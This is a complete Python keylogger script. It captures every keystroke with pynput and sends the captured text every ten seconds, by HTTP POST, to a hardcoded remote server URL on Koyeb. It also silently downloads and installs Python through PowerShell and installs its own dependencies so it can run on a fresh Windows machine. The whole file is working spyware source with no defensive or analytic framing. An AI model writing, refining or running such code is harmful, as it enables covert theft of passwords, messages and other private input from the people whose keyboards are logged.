import os
import sys
import subprocess
import time
import requests
from pynput import keyboard

# Replace with your Koyeb server URL
SERVER_URL = "https://bold-corina-tawabmotors-958670d7.koyeb.app/"
logged_keys = []

### 🔹 Check if Python is Installed and Install It (Windows Only) ###
def check_and_install_python():
    try:
        # Check Python version
        python_version = subprocess.check_output(["python", "--version"], stderr=subprocess.STDOUT, text=True)
        print(f"Python is installed: {python_version}")
    except FileNotFoundError:
        print("Python is not installed. Installing now...")
        
        # Download and Install Python
        python_installer_url = "https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe"
        installer_path = os.path.join(os.getenv("TEMP"), "python_installer.exe")
        
        # Download the installer
        subprocess.run(["powershell", "-Command", f"Invoke-WebRequest -Uri {python_installer_url} -OutFile {installer_path}"], shell=True)
        
        # Run the installer silently
        subprocess.run([installer_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"], shell=True)
        
        print("Python installation complete. Please restart the script.")
        sys.exit(0)  # Exit script after installation

### 🔹 Check and Install Required Python Packages ###
def install_dependencies():
    try:
        import pynput
        import requests
        print("All required packages are installed.")
    except ImportError:
        print("Installing required packages...")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], shell=True)
        subprocess.run([sys.executable, "-m", "pip", "install", "pynput", "requests"], shell=True)
        print("Installation complete. Restarting the script...")
        os.execl(sys.executable, sys.executable, *sys.argv)  # Restart script

### 🔹 Send Captured Keystrokes to the Server ###
def send_data():
    global logged_keys
    if logged_keys:
        try:
            data = {"keyboardData": "".join(logged_keys)}
            response = requests.post(SERVER_URL, json=data)
            print(f"Sent to server: {data} | Response: {response.text}")
            logged_keys = []  # Clear after sending
        except Exception as e:
            print(f"Error sending data: {e}")

### 🔹 Capture Keystrokes ###
def on_press(key):
    try:
        logged_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            logged_keys.append(" ")
        elif key == keyboard.Key.enter:
            logged_keys.append("\n")
        elif key == keyboard.Key.backspace:
            logged_keys.append("[BACKSPACE]")
        else:
            logged_keys.append(f"[{key.name}]")

### 🔹 Main Execution ###
if __name__ == "__main__":
    check_and_install_python()  # Check and install Python if needed
    install_dependencies()  # Install required dependencies

    # Start keylogger
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Send logs every 10 seconds
    while True:
        send_data()
        time.sleep(10)
